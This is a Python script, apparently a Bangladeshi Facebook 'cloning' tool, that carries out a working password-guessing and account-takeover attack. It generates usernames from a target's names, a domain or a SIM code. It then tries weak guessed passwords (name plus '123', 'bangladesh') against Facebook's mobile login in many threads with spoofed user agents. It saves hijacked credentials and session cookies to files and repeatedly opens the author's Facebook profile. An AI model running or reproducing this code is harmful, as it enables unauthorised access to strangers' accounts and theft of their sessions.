import os
try:
    import requests
except ImportError:
    print('\n [] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [] installing bs4 !...\n')
    os.system('pip install bs4')

import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
os.system("xdg-open https://www.facebook.com/AbRaHaM.Er.AbBu.01")
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
logo =("""

  ___ ___  ____           ____    ____  _____  __ __ 
|   |   ||    \         |    \  /    ||     ||  |  |
| _   _ ||  D  )        |  D  )|  o  ||   __||  |  |
|   |   ||    \  __     |    \ |  _  ||   _] |  :  |
|   |   ||  .  \|  |    |  .  \|  |  ||  |   |     |
|___|___||__|\_||__|    |__|\_||__|__||__|    \__,_|



\033[41m \033[1;37m           [RAFU 🔰💚]               \x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] Admin   : M R RAFU ✅🔰\033[1;32m     								  │
\033[1;34m│ [✓] Github  :\033[41m\033[1;37mrafu-404-cyber\x1b[0m            │
\033[1;35m│ [✓] Whtsapp : +8801982876336										               │
\033[1;36m│ [✓] Youtube : \x1b[1;32mLOADING...💚\x1b[1;97m         		    │
\033[1;32m└───────────────────────────────────────┘   """)

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" \033[1;92m  [1] EMAIL CLONING ")
        print(" \033[1;93m  [2] UID CLONING ")
        print(" \033[1;94m  [3] NUMBER CLONING")
        print(" \033[1;91m  [0] EXIT\n ═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══")
        RAFI =input("   [+] CHOOSE : ")
        if RAFI in ["1", "01"]:
            v1()
        if RAFI in ["2", "02"]:
            v2()
        if RAFI in ["3","03"]:
            v3()
        if RAFI in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system("xdg-open https://www.facebook.com/AbRaHaM.Er.AbBu.01")
    os.system('clear')
    print(logo)
    kode = input(' [+] TARGET FAST NAME : ')
    kodex = input(' [+] TARGET LAST NAME :  ')
    print("\033[1;92m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══")
    doamin = input(' [+] INPUT DOAMIN  : ')
    limit = int(input(' [?] AMMOUNT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system("xdg-open https://www.facebook.com/AbRaHaM.Er.AbBu.01")
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f"\033[1;92m [+]  TARGET DOAMIN:\033[1;91m {doamin}")
        print(' [+]  TOTAL IDS:\033[1;91m '+tl)
        print(' \033[1;92m[+]  PROCESS STARTED')
        print(' \033[1;95m[+]  USE FLIGHT (aroplane) MODE FOR 7 SEC')
        print("\033[1;92m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' \033[1;92m[+] CRACK PROCESS COMPLETED')
    print(' \033[1;92m[+] IDS SAVED IN ok.txt,cp.txt')
    print("\033[1;92m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══")
def v2():
    user=[]
    os.system("xdg-open https://www.facebook.com/AbRaHaM.Er.AbBu.01")
    os.system('clear')
    print(logo)
    kode = input('   [+] TARGET FAST NAME : ')
    kodex = input('   [+] TARGET LAST NAME : ')
    doamin = '.'
    limit = int(input('   [?] AMMOUNT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system("xdg-open https://www.facebook.com/AbRaHaM.Er.AbBu.01")
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f"\033[1;92m [+]  TARGET DOAMIN:\033[1;95m V3 CLONING")
        print(' [+]  Total ids:\033[1;91m '+tl)
        print(' \033[1;92m[+]  PROCESS STARTED')
        print(' \033[1;95m[+]  USE FLIGHT (aroplane) MODE FOR 7 SEC')
        print("\033[1;92m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══")
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' \033[1;92m[+] CRACK PROCESS COMPLETED')
    print(' \033[1;92m[+] IDS SAVED IN ok.txt,cp.txt')
    print("\033[1;92m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══")
def v3():
    user=[]
    os.system("xdg-open https://www.facebook.com/AbRaHaM.Er.AbBu.01")
    os.system('clear')
    print(logo)
    kode = input('   [+] ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' UID CLONING  '
    limit = int(input('   [?] AMMOUNT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system("xdg-open https://www.facebook.com/AbRaHaM.Er.AbBu.01")
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f"\033[1;92m   [+]  TARGET DOAMIN:\033[1;91m {doamin}")
        print('   [+]  TOTAL IDS:\033[1;91m '+tl)
        print(' \033[1;93m  [+]  PROCESS STARTED')
        print(' \033[1;95m  [+]  USE FLIGHT (aroplane) MODE FOR 7 SEC')
        print("\033[1;92m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' \033[1;92m[+] CRACK PROCESS COMPLETED')
    print(' \033[1;92m[+] IDS SAVED IN ok.txt,cp.txt')
    print("\033[1;92m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══")
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mRAFU\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=EPYGZMyH54dqibgj6inFkzfz; sb=EvYGZJH3mD0j005UjJULjsVs; vpd=792x720x2; dpr=2; m_pixel_ratio=2; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZZSDZ1U09uN1FCaFo1RTljRHNnbjZWMGk5eXR2MjB2YTRVZTRXZkF1VWlNMjhHZ3hMWUJDeXVfcEFoZExFZV9fdyIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZllINnVTT243UUJoWjVFOWNEc2duNlYwaTl5dHYyMHZhNFVlNFdmQXVVaU0yOEdneExZQkN5dV9wQWhkTEVlX193IiwicyI6Im0ifQ%3D%3D; locale=bn_IN; zsh=ASTAtHJNCJWmyvOHGtwiy6EfhwTdpX7xSl2UMc6mjOnemWpQsNwD-3cfqrGaxsHT2Oh4c0JhFxy0Wg7TdlxV0lPaFhVZF8ABpvLWrDkKb3lbI_X3kEYkrGejeNn-x2biQ3xtnTByIjM4wITRfH02mmAF-00mDsTGyYLCMjPCY7h2zOuqcqr1bdb3zpzEtjjPt0xColW77Yvf6Xr_idbTcVY4KE_BzD4zPycv6oApKdJESnsLQVPzBomm7_y7Q-3Y0e-kkpI6vJbvytoxxxKMavTOeQJkTHPTvRGkhpt-4Vh55vMtxgP8CZ-TOpNq5zu1JhlvQNkRAyYc9c0; wd=360x728; fr=0T76l1OZbTlAewkWV.AWV8rFGP5YiU6boT9aMx6FuoUok.BkEcX9.85.AAA.0.0.BkEqEg.AWWaPnujLiI',
    'referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fhome.php%3Ftbua%3D1%26subno_key%3DAaEq6DURAXP9gteygc7gjAEX76aorofqn3tgU81Q1py-z-TgQqoaUfAt6nL-DU5JC1qH7noBjaCnwjngfaq8i6hs_QnsX8l8QIvD2N-ei9ap9lW_5OVoOo3xsQHFYZdW1Xs3AMqMOBK-YvWXJEi3BHmHoXIXqDWShJtlAp9xcIKUTjwj6skqHAqiIns8K_xseCs2vZPZ29eCWx0rDvXFSQZm4UdLSFlzSZb3yPMknsbNAzG-H5RIRr6lJIDHaFEiV8LqdGlt3YGSF4QbnR3YrxZDSvhZ4ShqJTiB-ub5mFxnv6lTM9P117BxJLeEPx5r-Uw%26hrc%3D1%26refsrc%3Ddeprecated&refsrc=deprecated&_rdr',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[OK💚] {uid}|{ps}")
                print(f" \n [📍]Cookie : {coki}")
                open('/sdcard/RAFU/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[CP🔒] {uid}|{ps}")
                open('/sdcard/RAFU-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[RAFU] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
